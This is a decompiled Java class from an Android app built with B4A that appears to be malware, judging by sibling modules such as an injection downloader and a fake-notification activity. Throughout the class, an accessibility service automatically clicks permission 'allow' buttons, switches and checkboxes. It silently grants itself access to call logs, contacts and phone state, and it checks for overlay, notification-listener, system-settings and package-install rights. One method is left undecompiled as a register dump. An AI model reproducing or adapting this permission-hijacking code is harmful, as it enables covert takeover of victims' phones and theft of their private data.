package com.com.androidrr;

import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AClass;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.keywords.Regex;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.objects.RuntimePermissions;
import anywheresoftware.b4a.objects.Timer;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import com.tillekesoft.accessibilityservices.AccessibilityConstants;
import com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;

/* loaded from: classes.dex */
public class cls_perm_phneperms extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public boolean _isclassfinished = false;
    public long _lasttimechecked = 0;
    public Timer _timer_checker = null;
    public long _isperm_requestedtime = 0;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.cls_perm_phneperms");
            if (htSubs == null) {
                this.f268ba.loadHtSubs(getClass());
                htSubs = this.f268ba.htSubs;
            }
        }
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", cls_perm_phneperms.class).invoke(this, null);
        } else {
            this.f268ba.raiseEvent2(null, true, "class_globals", false, new Object[0]);
        }
    }

    public boolean _candrawoverlays() throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            JavaObject javaObject2 = new JavaObject();
            new Phone();
            if (Phone.getSdkVersion() < 23) {
                return true;
            }
            javaObject.InitializeContext(this.f268ba);
            javaObject2.InitializeStatic("android.provider.Settings");
            return BA.ObjectToBoolean(javaObject2.RunMethod("canDrawOverlays", new Object[]{javaObject.getObject()}));
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615073294", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }

    public boolean _canrequestpackageinstalls() throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(this.f268ba);
            new JavaObject();
            return BA.ObjectToBoolean(((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), javaObject.RunMethod("getPackageManager", (Object[]) Common.Null))).RunMethod("canRequestPackageInstalls", (Object[]) Common.Null));
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615204360", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }

    public boolean _canwritetosystemsettings() throws Exception {
        new Phone();
        if (Phone.getSdkVersion() < 23) {
            return true;
        }
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeContext(this.f268ba);
        JavaObject javaObject2 = new JavaObject();
        javaObject2.InitializeStatic("android.provider.Settings.System");
        return BA.ObjectToBoolean(javaObject2.RunMethod("canWrite", new Object[]{javaObject.getObject()}));
    }

    public boolean _check_if_notis() throws Exception {
        try {
            new Phone();
            String lowerCase = Phone.GetSettings("enabled_notification_listeners").toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            return lowerCase.contains(B4AApplication.getPackageName().toLowerCase());
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615007756", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }

    public String _class_globals() throws Exception {
        this._isclassfinished = false;
        this._lasttimechecked = 0L;
        this._timer_checker = new Timer();
        this._isperm_requestedtime = 0L;
        return "";
    }

    public String _click_one_switch(List list) throws Exception {
        try {
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("614811148", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_startcalllogperm()) {
            return "";
        }
        new Map();
        int size = list.getSize();
        for (int i = 0; i < size; i++) {
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) list.Get(i);
            java.util.Map map3 = map2;
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
            if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/switch_widget");
                _returner_to_act();
                return "";
            }
        }
        return "";
    }

    public String _in_case_system_button1_showing(List list) throws Exception {
        int i;
        try {
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("614942225", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_startcalllogperm()) {
            return "";
        }
        new Map();
        int size = list.getSize();
        while (i < size) {
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) list.Get(i);
            java.util.Map map3 = map2;
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
            i = (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("android:id/button1") || BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("permission_allow_button")) ? 0 : i + 1;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            Map map5 = new Map();
            java.util.Map map6 = (java.util.Map) Common.Null;
            java.util.Map map7 = map6;
            accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6));
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
            Map map8 = new Map();
            java.util.Map map9 = (java.util.Map) Common.Null;
            java.util.Map map10 = map9;
            accessibilityEventsListener3.PerformNodeActionOnViewWithArgs(true, "com.android.permissioncontroller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map8, map9));
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
            Map map11 = new Map();
            java.util.Map map12 = (java.util.Map) Common.Null;
            java.util.Map map13 = map12;
            accessibilityEventsListener5.PerformNodeActionOnViewWithArgs(true, "com.android.packageinstaller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map11, map12));
            _returner_to_act();
            return "";
        }
        return "";
    }

    public String _initialize(BA BA) throws Exception {
        innerInitialize(BA);
        return "";
    }

    public boolean _is_perm_requested() throws Exception {
        try {
            new dateutils._period();
            BA activityBA = getActivityBA();
            long j = this._isperm_requestedtime;
            DateTime dateTime = Common.DateTime;
            return dateutils._periodbetween(activityBA, j, DateTime.getNow()).Seconds <= 6;
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615597579", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return true;
        }
    }

    public int _number_of_switches(String str, String str2) throws Exception {
        if (Common.Not(str.contains(str2))) {
            return 0;
        }
        Arrays.fill(new String[0], "");
        Regex regex = Common.Regex;
        return Regex.Split(str2, str).length;
    }

    public void _performaction() throws Exception {
        new ResumableSub_PerformAction(this).resume(this.f268ba, null);
    }

    public static class ResumableSub_PerformAction extends BA.ResumableSub {
        cls_perm_phneperms parent;

        public ResumableSub_PerformAction(cls_perm_phneperms cls_perm_phnepermsVar) {
            this.parent = cls_perm_phnepermsVar;
        }

        /* JADX WARN: Removed duplicated region for block: B:47:0x00a4  */
        /* JADX WARN: Removed duplicated region for block: B:49:0x00ae A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r7, java.lang.Object[] r8) throws java.lang.Exception {
            /*
                r6 = this;
            L0:
                int r8 = r6.state     // Catch: java.lang.Exception -> L9f
                r0 = 9
                r1 = 7
                r2 = 4
                r3 = 1
                r4 = 0
                r5 = 10
                switch(r8) {
                    case -1: goto L9e;
                    case 0: goto L9a;
                    case 1: goto L91;
                    case 2: goto Ld;
                    case 3: goto L79;
                    case 4: goto L6b;
                    case 5: goto Ld;
                    case 6: goto L4e;
                    case 7: goto L4b;
                    case 8: goto Ld;
                    case 9: goto L2b;
                    case 10: goto L25;
                    case 11: goto Le;
                    default: goto Ld;
                }     // Catch: java.lang.Exception -> L9f
            Ld:
                goto L0
            Le:
                r6.state = r2     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "615335427"
                java.lang.String r0 = "PerformAction"
                com.com.androidrr.cls_perm_phneperms r1 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r1 = r1.__c     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.constants.Colors r1 = anywheresoftware.b4a.keywords.Common.Colors     // Catch: java.lang.Exception -> L9f
                r1 = -16711936(0xffffffffff00ff00, float:-1.7146522E38)
                anywheresoftware.b4a.keywords.Common.LogImpl(r8, r0, r1)     // Catch: java.lang.Exception -> L9f
                goto L0
            L25:
                r8 = -1
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                r6.catchState = r4     // Catch: java.lang.Exception -> L9f
                goto L0
            L2b:
                r6.state = r5     // Catch: java.lang.Exception -> L9f
                r6.catchState = r4     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "615335434"
                com.com.androidrr.cls_perm_phneperms r0 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r0 = r0.__c     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r0 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.BA r0 = r0.getActivityBA()     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.objects.B4AException r0 = anywheresoftware.b4a.keywords.Common.LastException(r0)     // Catch: java.lang.Exception -> L9f
                java.lang.String r0 = anywheresoftware.b4a.BA.ObjectToString(r0)     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common.LogImpl(r8, r0, r4)     // Catch: java.lang.Exception -> L9f
                goto L0
            L4b:
                r6.state = r5     // Catch: java.lang.Exception -> L9f
                goto L0
            L4e:
                r6.state = r1     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.backgroundservice r8 = r8._backgroundservice     // Catch: java.lang.Exception -> L9f
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper$AccessibilityEventsListener r8 = com.com.androidrr.backgroundservice._acs     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r0 = r6.parent     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.backgroundservice r0 = r0._backgroundservice     // Catch: java.lang.Exception -> L9f
                com.tillekesoft.accessibilityservices.AccessibilityConstants r0 = com.com.androidrr.backgroundservice._accservconstants     // Catch: java.lang.Exception -> L9f
                r8.PerformGlobalAction(r3)     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.backgroundservice r8 = r8._backgroundservice     // Catch: java.lang.Exception -> L9f
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper$AccessibilityEventsListener r8 = com.com.androidrr.backgroundservice._acs     // Catch: java.lang.Exception -> L9f
                r8 = 250(0xfa, float:3.5E-43)
                com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(r8)     // Catch: java.lang.Exception -> L9f
                goto L0
            L6b:
                r6.state = r1     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                boolean r8 = r8._startcalllogperm()     // Catch: java.lang.Exception -> L9f
                if (r8 == 0) goto L0
                r8 = 6
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                goto L0
            L79:
                r6.state = r2     // Catch: java.lang.Exception -> L9f
                r6.catchState = r0     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_phneperms r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.BA r8 = r8.getActivityBA()     // Catch: java.lang.Exception -> L9f
                r0 = 500(0x1f4, float:7.0E-43)
                anywheresoftware.b4a.keywords.Common.Sleep(r8, r6, r0)     // Catch: java.lang.Exception -> L9f
                r8 = 11
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                return
            L91:
                r6.state = r5     // Catch: java.lang.Exception -> L9f
                r6.catchState = r0     // Catch: java.lang.Exception -> L9f
                r8 = 3
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                goto L0
            L9a:
                r6.state = r3     // Catch: java.lang.Exception -> L9f
                goto L0
            L9e:
                return
            L9f:
                r8 = move-exception
                int r0 = r6.catchState
                if (r0 == 0) goto Lad
                int r0 = r6.catchState
                r6.state = r0
                r7.setLastException(r8)
                goto L0
            Lad:
                goto Laf
            Lae:
                throw r8
            Laf:
                goto Lae
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_phneperms.ResumableSub_PerformAction.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public Common.ResumableSubWrapper _real_checker(String str, String str2, List list, Object obj) throws Exception {
        ResumableSub_Real_Checker resumableSub_Real_Checker = new ResumableSub_Real_Checker(this, str, str2, list, obj);
        resumableSub_Real_Checker.resume(this.f268ba, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_Real_Checker);
    }

    public static class ResumableSub_Real_Checker extends BA.ResumableSub {
        int _int_number_of_switches = 0;
        Object _node;
        List _rootinactivewindow;
        String _strevt;
        String _strpkg;
        cls_perm_phneperms parent;

        public ResumableSub_Real_Checker(cls_perm_phneperms cls_perm_phnepermsVar, String str, String str2, List list, Object obj) {
            this.parent = cls_perm_phnepermsVar;
            this._strpkg = str;
            this._strevt = str2;
            this._rootinactivewindow = list;
            this._node = obj;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA BA, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            Common common = this.parent.__c;
                            Common.ReturnFromResumableSub(this, null);
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 27;
                            this.catchState = 26;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 26;
                            Common common2 = this.parent.__c;
                            Common common3 = this.parent.__c;
                            Colors colors = Common.Colors;
                            Common.LogImpl("614680066", "Phone ----> Real_Checker ", -65536);
                            break;
                        case 4:
                            this.state = 11;
                            boolean _check_if_notis = this.parent._check_if_notis();
                            Common common4 = this.parent.__c;
                            if (_check_if_notis) {
                                boolean _candrawoverlays = this.parent._candrawoverlays();
                                Common common5 = this.parent.__c;
                                if (_candrawoverlays) {
                                    boolean _canwritetosystemsettings = this.parent._canwritetosystemsettings();
                                    Common common6 = this.parent.__c;
                                    if (_canwritetosystemsettings) {
                                        boolean _canrequestpackageinstalls = this.parent._canrequestpackageinstalls();
                                        Common common7 = this.parent.__c;
                                        if (_canrequestpackageinstalls) {
                                            boolean _startcalllogperm = this.parent._startcalllogperm();
                                            Common common8 = this.parent.__c;
                                            if (!_startcalllogperm) {
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                            this.state = 6;
                            break;
                        case 6:
                            this.state = 7;
                            Timer timer = this.parent._timer_checker;
                            Common common9 = this.parent.__c;
                            timer.setEnabled(false);
                            cls_perm_phneperms cls_perm_phnepermsVar = this.parent;
                            Common common10 = cls_perm_phnepermsVar.__c;
                            cls_perm_phnepermsVar._isclassfinished = true;
                            break;
                        case 7:
                            this.state = 10;
                            backgroundservice backgroundserviceVar = this.parent._backgroundservice;
                            boolean _requestpowermngt = backgroundservice._cls_perm_pwr1._requestpowermngt();
                            Common common11 = this.parent.__c;
                            if (!_requestpowermngt) {
                                this.state = 9;
                                break;
                            } else {
                                break;
                            }
                        case 9:
                            this.state = 10;
                            this.parent._returner_to_act();
                            break;
                        case 10:
                            this.state = 11;
                            Common common12 = this.parent.__c;
                            Common common13 = this.parent.__c;
                            Common.ReturnFromResumableSub(this, true);
                            return;
                        case 11:
                            this.state = 12;
                            this._int_number_of_switches = 0;
                            this._int_number_of_switches = this.parent._number_of_switches(BA.ObjectToString(this._rootinactivewindow), "switch_widget");
                            Common common14 = this.parent.__c;
                            Common.LogImpl("614680079", "int_Number_Of_Switches : " + BA.NumberToString(this._int_number_of_switches), 0);
                            break;
                        case 12:
                            this.state = 19;
                            int i = this._int_number_of_switches;
                            if (i != 0) {
                                if (i != 1) {
                                    if (i <= 1) {
                                        break;
                                    } else {
                                        this.state = 18;
                                        break;
                                    }
                                } else {
                                    this.state = 16;
                                    break;
                                }
                            } else {
                                this.state = 14;
                                break;
                            }
                        case 14:
                            this.state = 19;
                            this.parent._in_case_system_button1_showing(this._rootinactivewindow);
                            break;
                        case 16:
                            this.state = 19;
                            this.parent._click_one_switch(this._rootinactivewindow);
                            break;
                        case 18:
                            this.state = 19;
                            this.parent._search_click_in_multiple_switches(this._rootinactivewindow);
                            break;
                        case 19:
                            this.state = 24;
                            boolean _startcalllogperm2 = this.parent._startcalllogperm();
                            Common common15 = this.parent.__c;
                            if (_startcalllogperm2) {
                                this.state = 21;
                                break;
                            } else {
                                this.state = 23;
                                break;
                            }
                        case 21:
                            this.state = 24;
                            Timer timer2 = this.parent._timer_checker;
                            Common common16 = this.parent.__c;
                            timer2.setEnabled(false);
                            cls_perm_phneperms cls_perm_phnepermsVar2 = this.parent;
                            Common common17 = cls_perm_phnepermsVar2.__c;
                            cls_perm_phnepermsVar2._isclassfinished = true;
                            break;
                        case 23:
                            this.state = 24;
                            this.parent._timer_creator();
                            break;
                        case 24:
                            this.state = 27;
                            break;
                        case 26:
                            this.state = 27;
                            this.catchState = 0;
                            Common common18 = this.parent.__c;
                            Common common19 = this.parent.__c;
                            Common.LogImpl("614680112", BA.ObjectToString(Common.LastException(this.parent.getActivityBA())), 0);
                            break;
                        case 27:
                            this.state = -1;
                            this.catchState = 0;
                            break;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    BA.setLastException(e);
                }
            }
        }
    }

    public String _request_perm() throws Exception {
        try {
            DateTime dateTime = Common.DateTime;
            this._isperm_requestedtime = DateTime.getNow();
            Common.StartActivity(this.f268ba, perm_phonecal.getObject());
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615663115", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _returner_to_act() throws Exception {
        try {
            Common.LogImpl("615532034", BA.ObjectToString(Boolean.valueOf(_startcalllogperm())), 0);
            if (!_startcalllogperm()) {
                return "";
            }
            if (this._timer_checker.IsInitialized()) {
                this._timer_checker.setEnabled(false);
            }
            this._isclassfinished = true;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            accessibilityEventsListener2.PerformGlobalAction(1);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615532052", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _search_click_in_multiple_switches(List list) throws Exception {
        int i;
        try {
            if (_startcalllogperm()) {
                return "";
            }
            new Map();
            int size = list.getSize();
            int i2 = 0;
            boolean z = false;
            while (i2 < size) {
                Map map = new Map();
                java.util.Map map2 = (java.util.Map) list.Get(i2);
                java.util.Map map3 = map2;
                Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                String lowerCase = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
                B4AApplication b4AApplication = Common.Application;
                if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                    z = true;
                }
                if (!z) {
                    i = size;
                } else if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase()) && 0.0d == BA.ObjectToNumber(map4.Get("checked"))) {
                    i = size;
                    if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/switch_widget")) {
                        _returner_to_act();
                        return "";
                    }
                } else {
                    i = size;
                    if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase()) && backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "android:id/checkbox")) {
                        _returner_to_act();
                        return "";
                    }
                }
                i2++;
                size = i;
            }
            if (_startcalllogperm()) {
                return "";
            }
            new Map();
            int size2 = list.getSize();
            for (int i3 = 0; i3 < size2; i3++) {
                Map map5 = new Map();
                java.util.Map map6 = (java.util.Map) list.Get(i3);
                java.util.Map map7 = map6;
                Map map8 = (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6);
                String lowerCase2 = BA.ObjectToString(map8.Get("ViewText")).toLowerCase();
                B4AApplication b4AApplication2 = Common.Application;
                if (lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                    int ObjectToNumber = (int) BA.ObjectToNumber(map8.Get("Left"));
                    int ObjectToNumber2 = (int) BA.ObjectToNumber(map8.Get("Top"));
                    int ObjectToNumber3 = (int) BA.ObjectToNumber(map8.Get("width"));
                    int ObjectToNumber4 = (int) BA.ObjectToNumber(map8.Get("Height"));
                    B4AApplication b4AApplication3 = Common.Application;
                    if (accessibilityEventsListener.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName().toLowerCase(), "")) {
                        _returner_to_act();
                        return "";
                    }
                }
            }
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            B4AApplication b4AApplication4 = Common.Application;
            String labelName = B4AApplication.getLabelName();
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            Map map9 = new Map();
            java.util.Map map10 = (java.util.Map) Common.Null;
            java.util.Map map11 = map10;
            accessibilityEventsListener2.PerformNodeActionOnViewWithArgs(false, labelName, 16, (Map) AbsObjectWrapper.ConvertToWrapper(map9, map10));
            _returner_to_act();
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("614876727", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public boolean _startcalllogperm() throws Exception {
        boolean z = true;
        try {
            RuntimePermissions runtimePermissions = starter._rp;
            RuntimePermissions runtimePermissions2 = starter._rp;
            RuntimePermissions runtimePermissions3 = starter._rp;
            RuntimePermissions runtimePermissions4 = starter._rp;
            RuntimePermissions runtimePermissions5 = starter._rp;
            Object[] objArr = {RuntimePermissions.PERMISSION_READ_CALL_LOG, RuntimePermissions.PERMISSION_WRITE_CALL_LOG, RuntimePermissions.PERMISSION_WRITE_CONTACTS, RuntimePermissions.PERMISSION_READ_CONTACTS, RuntimePermissions.PERMISSION_READ_PHONE_STATE};
            for (int i = 0; i < 5; i++) {
                if (!starter._rp.Check(BA.ObjectToString(objArr[i]))) {
                    z = false;
                }
            }
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615269898", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        return z;
    }

    public String _timer_creator() throws Exception {
        try {
            if (this._timer_checker.IsInitialized()) {
                return "";
            }
            this._timer_checker.Initialize(this.f268ba, "timerChecker", 4000L);
            this._timer_checker.setEnabled(true);
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615400967", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public String _timerchecker_tick() throws Exception {
        try {
            Colors colors = Common.Colors;
            Common.LogImpl("615466498", "Cls_Perm_PhnePerms timerChecker_Tick", -65536);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("615466519", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_startcalllogperm()) {
            this._timer_checker.setEnabled(false);
            _returner_to_act();
            return "";
        }
        if (this._isclassfinished) {
            this._timer_checker.setEnabled(false);
            _returner_to_act();
            return "";
        }
        new dateutils._period();
        BA activityBA = getActivityBA();
        long j = this._lasttimechecked;
        DateTime dateTime = Common.DateTime;
        if (dateutils._periodbetween(activityBA, j, DateTime.getNow()).Seconds > 4) {
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            accessibilityEventsListener.PerformGlobalAction(4);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
        }
        return "";
    }

    @Override // anywheresoftware.b4a.BA.SubDelegator
    public Object callSub(String str, Object obj, Object[] objArr) throws Exception {
        BA.senderHolder.set(obj);
        return BA.SubDelegator.SubNotFound;
    }
}
